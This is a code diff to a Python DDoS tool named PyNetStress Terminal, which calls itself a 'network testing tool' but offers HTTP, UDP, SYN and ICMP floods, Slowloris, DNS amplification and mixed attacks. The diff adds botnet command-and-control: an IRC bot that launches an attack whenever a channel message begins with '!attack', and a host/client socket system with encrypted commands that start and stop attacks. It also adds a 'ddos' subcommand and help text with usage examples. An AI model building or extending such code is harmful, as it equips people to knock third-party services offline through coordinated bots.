-            self.syn_flood(self.target_ip, port, bots, threads, duration)
-        elif method == "ICMP Flood":
-            self.icmp_flood(self.target_ip, port, bots, threads, duration)
-        elif method == "Slowloris":
-            self.slowloris(self.target_ip, port, bots, threads, duration)
-        elif method == "DNS Amplification":
-            self.dns_amplification(self.target_ip, port, bots, threads, duration)
-        elif method == "Mixed Attack":
-            self.mixed_attack(self.target_ip, port, bots, threads, duration)
+        if self.method == "HTTP Flood":
+            self.http_flood()
+        elif self.method == "UDP Flood":
+            self.udp_flood()
+        elif self.method == "SYN Flood":
+            self.syn_flood()
+        elif self.method == "ICMP Flood":
+            self.icmp_flood()
+        elif self.method == "Slowloris":
+            self.slowloris()
+        elif self.method == "DNS Amplification":
+            self.dns_amplification()
+        elif self.method == "Mixed Attack":
+            self.mixed_attack()
         else:
-            print(f"[ERROR] Unknown attack method: {method}")
+            self.print_status(f"Unknown attack method: {self.method}", "error")
             return False
         
         self.running = False
@@ -707,19 +796,6 @@ class PyNetStressTerminal:
             requests = self.attack_stats['requests_sent']
             bytes_sent = self.attack_stats['bytes_sent']
             
-            # Calculate network usage if we can access the stats
-            if self.start_network_stats is not None:
-                try:
-                    current_stats = psutil.net_io_counters()
-                    elapsed_time = time.time() - start_time
-                    if elapsed_time > 0:
-                        bytes_sent_diff = current_stats.bytes_sent - self.start_network_stats.bytes_sent
-                        self.network_usage = bytes_sent_diff / elapsed_time / 1024  # KB/s
-                except (PermissionError, FileNotFoundError):
-                    self.start_network_stats = None
-                    self.network_usage = 0
-            
-            # Calculate data units
             if bytes_sent > 1024*1024*1024:
                 data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
             elif bytes_sent > 1024*1024:
@@ -728,27 +804,17 @@ class PyNetStressTerminal:
                 data_text = f"{bytes_sent/1024:.2f} KB"
             else:
                 data_text = f"{bytes_sent} B"
-                
-            # Get CPU and memory usage
-            try:
-                self.cpu_usage = psutil.cpu_percent()
-                memory = psutil.virtual_memory()
-                self.memory_usage = memory.percent
-            except (PermissionError, FileNotFoundError):
-                self.cpu_usage = 0
-                self.memory_usage = 0
-                
-            # Clear line and print stats
+            
+            if int(elapsed) % 10 == 0:
+                status = self.check_target_status()
+                self.attack_stats['target_status'] = status
+            
             sys.stdout.write("\033[K")
-            if self.start_network_stats is not None:
-                sys.stdout.write(f"\r[STATS] Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | CPU: {self.cpu_usage:.1f}% | Mem: {self.memory_usage:.1f}% | Net: {self.network_usage:.1f} KB/s")
-            else:
-                sys.stdout.write(f"\r[STATS] Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | CPU: {self.cpu_usage:.1f}% | Mem: {self.memory_usage:.1f}%")
+            sys.stdout.write(f"\r{Fore.CYAN}[STATS]{Style.RESET_ALL} Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text} | Status: {TARGET_COLORS[self.attack_stats['target_status']]}{self.attack_stats['target_status'].upper()}{Style.RESET_ALL}")
             sys.stdout.flush()
             
             time.sleep(1)
-            
-        # Final stats
+        
         elapsed = time.time() - start_time
         packets = self.attack_stats['packets_sent']
         requests = self.attack_stats['requests_sent']
@@ -762,240 +828,314 @@ class PyNetStressTerminal:
             data_text = f"{bytes_sent/1024:.2f} KB"
         else:
             data_text = f"{bytes_sent} B"
-            
-        print(f"\n[INFO] Attack completed in {int(elapsed)}s")
-        print(f"[INFO] Total packets: {packets:,}")
-        print(f"[INFO] Total requests: {requests:,}")
-        print(f"[INFO] Total data: {data_text}")
+        
+        print(f"\n{Fore.GREEN}[INFO]{Style.RESET_ALL} Attack completed in {int(elapsed)}s")
+        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Total packets: {packets:,}")
+        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Total requests: {requests:,}")
+        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Total data: {data_text}")
     
-    def ping(self, target):
-        if not self.resolve_target(target):
-            return False
-        
-        count = 4
-        timeout = 2
-        
-        print(f"[INFO] Pinging {target} ({self.target_ip}) with {count} packets")
-        
-        # Use different ping commands based on platform
-        if os.name == 'nt':
-            cmd = ['ping', '-n', str(count), '-w', str(timeout*1000), self.target_ip]
-        elif IS_TERMUX:
-            # Termux-specific ping command
-            cmd = ['ping', '-c', str(count), '-W', str(timeout), self.target_ip]
-        else:
-            cmd = ['ping', '-c', str(count), '-W', str(timeout), self.target_ip]
-            
-        try:
-            self.debug_log(f"Executing: {' '.join(cmd)}")
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            print(result.stdout)
-            if result.stderr:
-                print(result.stderr)
-        except Exception as e:
-            print(f"[ERROR] Ping failed: {e}")
-    
-    def traceroute(self, target):
-        if not self.resolve_target(target):
-            return False
-        
-        print(f"[INFO] Traceroute to {target} ({self.target_ip})")
-        
-        # Use different traceroute commands based on platform
-        if os.name == 'nt':
-            cmd = ['tracert', self.target_ip]
-        elif IS_TERMUX:
-            # Termux might not have traceroute installed by default
-            print("[WARNING] Traceroute may not be available in Termux")
-            print("Install with: pkg install traceroute")
-            return
-        else:
-            cmd = ['traceroute', self.target_ip]
-            
-        try:
-            self.debug_log(f"Executing: {' '.join(cmd)}")
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            print(result.stdout)
-            if result.stderr:
-                print(result.stderr)
-        except Exception as e:
-            print(f"[ERROR] Traceroute failed: {e}")
-    
-    def port_scan(self, target):
-        if not self.resolve_target(target):
-            return False
-        
-        print(f"[INFO] Scanning common ports on {target} ({self.target_ip})")
-        
-        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 587, 993, 995, 3306, 3389, 8080, 8443]
-        open_ports = []
-        
-        for port in common_ports:
-            try:
-                self.debug_log(f"Scanning port {port}")
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(1)
-                    result = s.connect_ex((self.target_ip, port))
-                    if result == 0:
-                        open_ports.append(port)
-                        print(f"[+] Port {port}: OPEN")
-                    else:
-                        if DEBUG_MODE:
-                            print(f"[-] Port {port}: closed")
-            except Exception as e:
-                if DEBUG_MODE:
-                    print(f"[ERROR] Error scanning port {port}: {e}")
-        
-        print(f"[INFO] Open ports: {', '.join(map(str, open_ports))}")
-    
-    def whois_lookup(self, target):
-        try:
-            print(f"[INFO] WHOIS lookup for {target}")
-            self.debug_log(f"Performing WHOIS lookup for {target}")
-            w = whois.whois(target)
-            print(f"Domain: {w.domain_name}")
-            print(f"Registrar: {w.registrar}")
-            print(f"Creation Date: {w.creation_date}")
-            print(f"Expiration Date: {w.expiration_date}")
-            print(f"Name Servers: {w.name_servers}")
-        except Exception as e:
-            print(f"[ERROR] WHOIS lookup failed: {e}")
-    
-    def dns_enum(self, target):
-        try:
-            print(f"[INFO] DNS enumeration for {target}")
-            self.debug_log(f"Performing DNS enumeration for {target}")
-            resolver = dns.resolver.Resolver()
-            
-            # A records
-            try:
-                answers = resolver.resolve(target, 'A')
-                print("A Records:")
-                for rdata in answers:
-                    print(f"  {rdata.address}")
-            except Exception as e:
-                print("No A records found")
-                self.debug_log(f"A record query failed: {e}")
-            
-            # MX records
-            try:
-                answers = resolver.resolve(target, 'MX')
-                print("MX Records:")
-                for rdata in answers:
-                    print(f"  {rdata.exchange} (priority {rdata.preference})")
-            except Exception as e:
-                print("No MX records found")
-                self.debug_log(f"MX record query failed: {e}")
-            
-            # NS records
-            try:
-                answers = resolver.resolve(target, 'NS')
-                print("NS Records:")
-                for rdata in answers:
-                    print(f"  {rdata.target}")
-            except Exception as e:
-                print("No NS records found")
-                self.debug_log(f"NS record query failed: {e}")
-                
-        except Exception as e:
-            print(f"[ERROR] DNS enumeration failed: {e}")
-    
-    def subdomain_scan(self, target):
-        print(f"[INFO] Scanning for subdomains of {target}")
-        self.debug_log(f"Scanning for subdomains of {target}")
-        
-        common_subdomains = [
-            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
-            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
-            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
-            'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
-            'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
-            'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video',
-            'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'files', 'host', 'ssl', 'search',
-            'staging', 'fw', 'manager', 'cdn2', 'irc', 'job', 'img2', 'ssh', 'online', 'owa'
-        ]
-        
-        found_subdomains = []
-        
-        for subdomain in common_subdomains:
-            full_domain = f"{subdomain}.{target}"
-            try:
-                self.debug_log(f"Checking subdomain: {full_domain}")
-                socket.gethostbyname(full_domain)
-                found_subdomains.append(full_domain)
-                print(f"[+] Found: {full_domain}")
-            except:
-                if DEBUG_MODE:
-                    print(f"[-] Not found: {full_domain}")
-        
-        print(f"[INFO] Found {len(found_subdomains)} subdomains")
-    
-    def network_scan(self, network):
-        print(f"[INFO] Scanning network {network}")
-        self.debug_log(f"Scanning network {network}")
+    def start_irc_bot(self, server, port, channel, nickname, password=None):
+        self.print_status(f"Connecting to IRC server: {server}:{port}", "info")
         
         try:
-            network = ipaddress.ip_network(network, strict=False)
-        except ValueError:
-            print(f"[ERROR] Invalid network: {network}")
-            return
-        
-        live_hosts = []
-        
-        for ip in network.hosts():
-            ip_str = str(ip)
-            try:
-                hostname = socket.gethostbyaddr(ip_str)[0]
-            except:
-                hostname = "Unknown"
-                
-            # Use different ping commands based on platform
-            if os.name == 'nt':
-                cmd = ['ping', '-n', '1', '-w', '1000', ip_str]
-            elif IS_TERMUX:
-                cmd = ['ping', '-c', '1', '-W', '1', ip_str]
+            reactor = irc.client.Reactor()
+            
+            if password:
+                self.irc_client = reactor.server().connect(
+                    server, port, nickname, password=password
+                )
             else:
-                cmd = ['ping', '-c', '1', '-W', '1', ip_str]
-                
-            try:
-                self.debug_log(f"Pinging host: {ip_str}")
-                result = subprocess.run(cmd, capture_output=True, text=True)
-                if result.returncode == 0:
-                    live_hosts.append((ip_str, hostname))
-                    print(f"[+] Live host: {ip_str} ({hostname})")
-                elif DEBUG_MODE:
-                    print(f"[-] Host down: {ip_str}")
-            except Exception as e:
-                if DEBUG_MODE:
-                    print(f"[ERROR] Error pinging {ip_str}: {e}")
-        
-        print(f"[INFO] Found {len(live_hosts)} live hosts in {network}")
+                self.irc_client = reactor.server().connect(server, port, nickname)
+            
+            self.irc_client.add_global_handler("welcome", self.on_connect)
+            self.irc_client.add_global_handler("join", self.on_join)
+            self.irc_client.add_global_handler("privmsg", self.on_message)
+            
+            self.irc_channel = channel
+            self.irc_connected = True
+            
+            irc_thread = threading.Thread(target=reactor.process_forever)
+            irc_thread.daemon = True
+            irc_thread.start()
+            
+            self.print_status("IRC bot started successfully", "success")
+            return True
+        except Exception as e:
+            self.print_status(f"Failed to start IRC bot: {e}", "error")
+            return False
     
-    def speed_test(self):
-        print("[INFO] Testing network speed...")
-        self.debug_log("Starting network speed test")
+    def on_connect(self, connection, event):
+        self.print_status("Connected to IRC server", "success")
+        connection.join(self.irc_channel)
+    
+    def on_join(self, connection, event):
+        self.print_status(f"Joined channel: {event.target}", "success")
+    
+    def on_message(self, connection, event):
+        try:
+            message = event.arguments[0]
+            sender = event.source.split('!')[0]
+            
+            self.print_status(f"IRC message from {sender}: {message}", "debug")
+            
+            if message.startswith("!attack"):
+                self.handle_irc_command(message, sender)
+        except Exception as e:
+            self.log(f"Error processing IRC message: {e}", "error")
+    
+    def handle_irc_command(self, message, sender):
+        try:
+            parts = message.split()
+            if len(parts) < 2:
+                self.irc_client.privmsg(self.irc_channel, "Usage: !attack <method> <target> [port] [duration]")
+                return
+            
+            method = parts[1].upper()
+            target = parts[2]
+            port = int(parts[3]) if len(parts) > 3 else 80
+            duration = int(parts[4]) if len(parts) > 4 else 30
+            
+            self.print_status(f"Received attack command from {sender}: {method} {target}:{port} for {duration}s", "info")
+            
+            self.method = method
+            self.target_url = target
+            self.target_port = port
+            self.duration = duration
+            
+            attack_thread = threading.Thread(target=self.start_attack)
+            attack_thread.daemon = True
+            attack_thread.start()
+            
+            self.irc_client.privmsg(self.irc_channel, f"Attack started: {method} on {target}:{port} for {duration}s")
+        except Exception as e:
+            self.irc_client.privmsg(self.irc_channel, f"Error: {str(e)}")
+    
+    def start_local_server(self, host='0.0.0.0', port=8888):
+        self.print_status(f"Starting local server on {host}:{port}", "info")
         
         try:
-            st = speedtest.Speedtest()
-            st.get_best_server()
-            download = st.download() / 1_000_000
-            upload = st.upload() / 1_000_000
-            ping = st.results.ping
-            print(f"Download: {download:.2f} Mbps")
-            print(f"Upload: {upload:.2f} Mbps")
-            print(f"Ping: {ping:.2f} ms")
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket.bind((host, port))
+            server_socket.listen(5)
+            
+            self.local_server = server_socket
+            self.local_server_running = True
+            
+            server_thread = threading.Thread(target=self.handle_local_clients)
+            server_thread.daemon = True
+            server_thread.start()
+            
+            self.print_status("Local server started successfully", "success")
+            return True
         except Exception as e:
-            print(f"[ERROR] Speed test failed: {e}")
-
-def main():
-    global DEBUG_MODE
+            self.print_status(f"Failed to start local server: {e}", "error")
+            return False
     
-    # Create argument parser with extended help
-    parser = argparse.ArgumentParser(
-        description="PyNetStress Terminal Version - Advanced Network Testing Tool",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Attack Methods:
+    def handle_local_clients(self):
+        while self.local_server_running:
+            try:
+                client_socket, client_address = self.local_server.accept()
+                self.print_status(f"New client connected: {client_address}", "info")
+                
+                self.clients.append(client_socket)
+                
+                client_thread = threading.Thread(target=self.handle_local_client, args=(client_socket,))
+                client_thread.daemon = True
+                client_thread.start()
+            except Exception as e:
+                self.log(f"Error accepting client: {e}", "error")
+    
+    def handle_local_client(self, client_socket):
+        try:
+            while True:
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+                
+                try:
+                    message = self.decrypt_data(data.decode())
+                    self.print_status(f"Received command from client: {message}", "debug")
+                    
+                    response = self.process_local_command(message)
+                    
+                    encrypted_response = self.encrypt_data(response)
+                    client_socket.send(encrypted_response.encode())
+                except Exception as e:
+                    self.log(f"Error processing client command: {e}", "error")
+                    client_socket.send(self.encrypt_data(f"Error: {e}").encode())
+        except Exception as e:
+            self.log(f"Client connection error: {e}", "error")
+        finally:
+            client_socket.close()
+            if client_socket in self.clients:
+                self.clients.remove(client_socket)
+    
+    def process_local_command(self, command):
+        try:
+            parts = command.split()
+            if not parts:
+                return "Error: Empty command"
+            
+            cmd = parts[0].lower()
+            
+            if cmd == "attack":
+                if len(parts) < 3:
+                    return "Usage: attack <method> <target> [port] [duration]"
+                
+                method = parts[1]
+                target = parts[2]
+                port = int(parts[3]) if len(parts) > 3 else 80
+                duration = int(parts[4]) if len(parts) > 4 else 30
+                
+                self.method = method
+                self.target_url = target
+                self.target_port = port
+                self.duration = duration
+                
+                attack_thread = threading.Thread(target=self.start_attack)
+                attack_thread.daemon = True
+                attack_thread.start()
+                
+                return f"Attack started: {method} on {target}:{port} for {duration}s"
+            
+            elif cmd == "status":
+                status = self.check_target_status()
+                return f"Target status: {status}"
+            
+            elif cmd == "stats":
+                packets = self.attack_stats['packets_sent']
+                requests = self.attack_stats['requests_sent']
+                bytes_sent = self.attack_stats['bytes_sent']
+                return f"Packets: {packets}, Requests: {requests}, Data: {bytes_sent} bytes"
+            
+            elif cmd == "stop":
+                self.running = False
+                return "Attack stopped"
+            
+            else:
+                return f"Unknown command: {cmd}"
+        except Exception as e:
+            return f"Error processing command: {e}"
+    
+    def send_to_clients(self, message):
+        encrypted_message = self.encrypt_data(message)
+        
+        for client in self.clients[:]:
+            try:
+                client.send(encrypted_message.encode())
+            except Exception as e:
+                self.log(f"Error sending to client: {e}", "error")
+                self.clients.remove(client)
+    
+    def start_ddos_system(self, mode, target=None):
+        if mode == "local":
+            if not target:
+                self.print_status("Starting local DDoS system (host mode)", "info")
+                return self.start_local_server()
+            else:
+                self.print_status("Starting local DDoS system (client mode)", "info")
+                return self.connect_to_local_server(target)
+        elif mode == "irc":
+            if not target:
+                self.print_status("IRC server required for IRC mode", "error")
+                return False
+            
+            parts = target.split(':')
+            server = parts[0]
+            port = int(parts[1]) if len(parts) > 1 else 6667
+            channel = parts[2] if len(parts) > 2 else "#pynetstress"
+            nickname = parts[3] if len(parts) > 3 else "pynetstress_bot"
+            password = parts[4] if len(parts) > 4 else None
+            
+            return self.start_irc_bot(server, port, channel, nickname, password)
+        else:
+            self.print_status(f"Unknown DDoS mode: {mode}", "error")
+            return False
+    
+    def connect_to_local_server(self, server_address):
+        try:
+            parts = server_address.split(':')
+            host = parts[0]
+            port = int(parts[1]) if len(parts) > 1 else 8888
+            
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((host, port))
+            
+            self.clients.append(client_socket)
+            
+            client_thread = threading.Thread(target=self.handle_server_messages, args=(client_socket,))
+            client_thread.daemon = True
+            client_thread.start()
+            
+            self.print_status(f"Connected to local server: {server_address}", "success")
+            return True
+        except Exception as e:
+            self.print_status(f"Failed to connect to local server: {e}", "error")
+            return False
+    
+    def handle_server_messages(self, client_socket):
+        try:
+            while True:
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+                
+                try:
+                    message = self.decrypt_data(data.decode())
+                    self.print_status(f"Received from server: {message}", "info")
+                    
+                    response = self.process_local_command(message)
+                    
+                    encrypted_response = self.encrypt_data(response)
+                    client_socket.send(encrypted_response.encode())
+                except Exception as e:
+                    self.log(f"Error processing server message: {e}", "error")
+        except Exception as e:
+            self.log(f"Server connection error: {e}", "error")
+        finally:
+            client_socket.close()
+            if client_socket in self.clients:
+                self.clients.remove(client_socket)
+
+def show_help():
+    help_text = f"""{Fore.CYAN}
+PyNetStress Terminal v{VERSION} - Help
+{'-' * 50}
+
+{Fore.YELLOW}USAGE:{Style.RESET_ALL}
+  python pynetstress.py [OPTIONS] [COMMAND] [ARGS]
+
+{Fore.YELLOW}OPTIONS:{Style.RESET_ALL}
+  -h, --help            Show this help message
+  -v, --version         Show version information
+  -d, --debug           Enable debug mode
+
+{Fore.YELLOW}COMMANDS:{Style.RESET_ALL}
+  attack <target>       Start attack on target
+    -m, --method        Attack method (default: HTTP Flood)
+    -b, --bots          Number of bots (default: 100)
+    -t, --threads       Threads per bot (default: 50)
+    -p, --port          Target port (default: 80)
+    -d, --duration      Attack duration in seconds (default: 30)
+    --proxy-file        Load proxies from file
+
+  recon <command>       Reconnaissance commands
+    ping <target>       Ping a target
+    traceroute <target> Traceroute to a target
+    portscan <target>   Scan common ports on target
+    whois <target>      WHOIS lookup for target
+    dns <target>        DNS enumeration for target
+    subdomain <target>  Subdomain scan for target
+
+  ddos <mode>           Start DDoS system
+    local [host]        Local server mode (host or client)
+    irc <server>        IRC bot mode
+
+  status                Check target status
+  stop                  Stop current attack
+
+{Fore.YELLOW}ATTACK METHODS:{Style.RESET_ALL}
   HTTP Flood        - Flood target with HTTP requests
   UDP Flood         - Flood target with UDP packets (requires root)
   SYN Flood         - SYN flood attack (requires root)
@@ -1004,129 +1144,121 @@ Attack Methods:
   DNS Amplification - DNS amplification attack (requires root)
   Mixed Attack      - Combined attack using all methods
 
-Reconnaissance Commands:
-  ping       - Ping a target
-  traceroute - Traceroute to a target
-  portscan   - Scan common ports on a target
-  whois      - WHOIS lookup for a target
-  dns        - DNS enumeration for a target
-  subdomain  - Subdomain scan for a target
-  netscan    - Network scan (CIDR notation)
-  speedtest  - Network speed test
-
-Examples:
-  python pynetstress.py attack example.com -m "HTTP Flood" -b 100 -t 50 -d 60
+{Fore.YELLOW}EXAMPLES:{Style.RESET_ALL}
+  python pynetstress.py attack example.com -m "HTTP Flood" -b 100 -t 50
   python pynetstress.py recon ping example.com
-  python pynetstress.py recon portscan example.com
+  python pynetstress.py ddos local
+  python pynetstress.py ddos irc irc.example.com:6667:#channel:botname
   python pynetstress.py --debug attack example.com -m "Mixed Attack"
-        """
-    )
+{Style.RESET_ALL}"""
+    print(help_text)
+
+def main():
+    global DEBUG_MODE
+    
+    parser = argparse.ArgumentParser(description="PyNetStress Terminal - Advanced Network Testing Tool", add_help=False)
+    parser.add_argument('-h', '--help', action='store_true', help='Show help message')
+    parser.add_argument('-v', '--version', action='store_true', help='Show version information')
+    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
     
     subparsers = parser.add_subparsers(dest='command', help='Command to execute')
     
-    # Attack command
-    attack_parser = subparsers.add_parser('attack', help='Launch an attack')
+    attack_parser = subparsers.add_parser('attack', help='Start attack on target')
     attack_parser.add_argument('target', help='Target URL or IP address')
-    attack_parser.add_argument('-m', '--method', choices=['HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 'Slowloris', 'DNS Amplification', 'Mixed Attack'], 
-                              default='HTTP Flood', help='Attack method')
+    attack_parser.add_argument('-m', '--method', default='HTTP Flood', 
+                              choices=['HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 'Slowloris', 'DNS Amplification', 'Mixed Attack'],
+                              help='Attack method')
     attack_parser.add_argument('-b', '--bots', type=int, default=100, help='Number of bots')
     attack_parser.add_argument('-t', '--threads', type=int, default=50, help='Threads per bot')
-    attack_parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds')
     attack_parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
+    attack_parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds')
+    attack_parser.add_argument('--proxy-file', help='Load proxies from file')
     
-    # Recon command
-    recon_parser = subparsers.add_parser('recon', help='Reconnaissance tools')
-    recon_subparsers = recon_parser.add_subparsers(dest='recon_command', help='Reconnaissance command')
+    recon_parser = subparsers.add_parser('recon', help='Reconnaissance commands')
+    recon_parser.add_argument('recon_command', choices=['ping', 'traceroute', 'portscan', 'whois', 'dns', 'subdomain'],
+                             help='Reconnaissance command')
+    recon_parser.add_argument('recon_target', help='Target for reconnaissance')
     
-    # Recon subcommands
-    ping_parser = recon_subparsers.add_parser('ping', help='Ping a target')
-    ping_parser.add_argument('target', help='Target to ping')
+    ddos_parser = subparsers.add_parser('ddos', help='Start DDoS system')
+    ddos_parser.add_argument('mode', choices=['local', 'irc'], help='DDoS mode')
+    ddos_parser.add_argument('target', nargs='?', help='Target server for DDoS system')
     
-    traceroute_parser = recon_subparsers.add_parser('traceroute', help='Traceroute to a target')
-    traceroute_parser.add_argument('target', help='Target for traceroute')
+    subparsers.add_parser('status', help='Check target status')
+    subparsers.add_parser('stop', help='Stop current attack')
     
-    portscan_parser = recon_subparsers.add_parser('portscan', help='Scan ports on a target')
-    portscan_parser.add_argument('target', help='Target to scan')
+    args, unknown = parser.parse_known_args()
     
-    whois_parser = recon_subparsers.add_parser('whois', help='WHOIS lookup for a target')
-    whois_parser.add_argument('target', help='Target for WHOIS lookup')
-    
-    dns_parser = recon_subparsers.add_parser('dns', help='DNS enumeration for a target')
-    dns_parser.add_argument('target', help='Target for DNS enumeration')
-    
-    subdomain_parser = recon_subparsers.add_parser('subdomain', help='Subdomain scan for a target')
-    subdomain_parser.add_argument('target', help='Target for subdomain scan')
-    
-    netscan_parser = recon_subparsers.add_parser('netscan', help='Network scan')
-    netscan_parser.add_argument('network', help='Network to scan (CIDR notation)')
-    
-    speedtest_parser = recon_subparsers.add_parser('speedtest', help='Network speed test')
-    
-    # Reset command
-    reset_parser = subparsers.add_parser('reset', help='Reset statistics')
-    
-    # Global debug flag
-    parser.add_argument('--debug', action='store_true', help='Enable debug mode with detailed logging')
-    
-    args = parser.parse_args()
-    
-    # Set debug mode
-    if hasattr(args, 'debug'):
-        DEBUG_MODE = args.debug
-    
-    # Show help if no arguments provided
-    if len(sys.argv) == 1:
-        parser.print_help()
+    if args.help or not hasattr(args, 'command'):
+        show_help()
         return
+    
+    if args.version:
+        print(f"PyNetStress Terminal v{VERSION}")
+        return
+    
+    DEBUG_MODE = args.debug
     
     tool = PyNetStressTerminal()
     tool.print_banner()
     
-    if args.command == 'attack':
-        if not IS_ROOT and args.method in ['UDP Flood', 'SYN Flood', 'ICMP Flood', 'DNS Amplification']:
-            print("[WARNING] This method requires root privileges. Some features may not work.")
+    try:
+        if args.command == 'attack':
+            tool.target_url = args.target
+            tool.method = args.method
+            tool.bot_count = args.bots
+            tool.thread_count = args.threads
+            tool.target_port = args.port
+            tool.duration = args.duration
+            
+            if args.proxy_file:
+                tool.use_proxies = tool.load_proxies(args.proxy_file)
+            
+            tool.start_attack()
         
-        tool.start_attack(
-            target=args.target,
-            method=args.method,
-            bots=args.bots,
-            threads=args.threads,
-            duration=args.duration,
-            port=args.port
-        )
+        elif args.command == 'recon':
+            if args.recon_command == 'ping':
+                tool.ping(args.recon_target)
+            elif args.recon_command == 'traceroute':
+                tool.traceroute(args.recon_target)
+            elif args.recon_command == 'portscan':
+                tool.port_scan(args.recon_target)
+            elif args.recon_command == 'whois':
+                tool.whois_lookup(args.recon_target)
+            elif args.recon_command == 'dns':
+                tool.dns_enum(args.recon_target)
+            elif args.recon_command == 'subdomain':
+                tool.subdomain_scan(args.recon_target)
+        
+        elif args.command == 'ddos':
+            tool.start_ddos_system(args.mode, args.target)
+            
+            if args.mode == 'local' and not args.target:
+                tool.print_status("Local server running. Press Ctrl+C to stop.", "info")
+                try:
+                    while True:
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    tool.print_status("Stopping local server", "info")
+                    tool.local_server_running = False
+                    if tool.local_server:
+                        tool.local_server.close()
+        
+        elif args.command == 'status':
+            if tool.resolve_target(tool.target_url if tool.target_url else "example.com"):
+                status = tool.check_target_status()
+                tool.print_target_status(status)
+        
+        elif args.command == 'stop':
+            tool.running = False
+            tool.print_status("Attack stopped", "success")
     
-    elif args.command == 'recon':
-        if args.recon_command == 'ping':
-            tool.ping(args.target)
-        elif args.recon_command == 'traceroute':
-            tool.traceroute(args.target)
-        elif args.recon_command == 'portscan':
-            tool.port_scan(args.target)
-        elif args.recon_command == 'whois':
-            tool.whois_lookup(args.target)
-        elif args.recon_command == 'dns':
-            tool.dns_enum(args.target)
-        elif args.recon_command == 'subdomain':
-            tool.subdomain_scan(args.target)
-        elif args.recon_command == 'netscan':
-            tool.network_scan(args.network)
-        elif args.recon_command == 'speedtest':
-            tool.speed_test()
-        else:
-            recon_parser.print_help()
-    
-    elif args.command == 'reset':
-        tool.reset_stats()
-    
-    else:
-        parser.print_help()
+    except KeyboardInterrupt:
+        tool.print_status("Operation cancelled by user", "warning")
+    except Exception as e:
+        tool.print_status(f"Error: {e}", "error")
+        if DEBUG_MODE:
+            import traceback
+            traceback.print_exc()
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n[INFO] Exiting...")
-        sys.exit(0)
-    except Exception as e:
-        print(f"[ERROR] {e}")
-        sys.exit(1)
+    main()
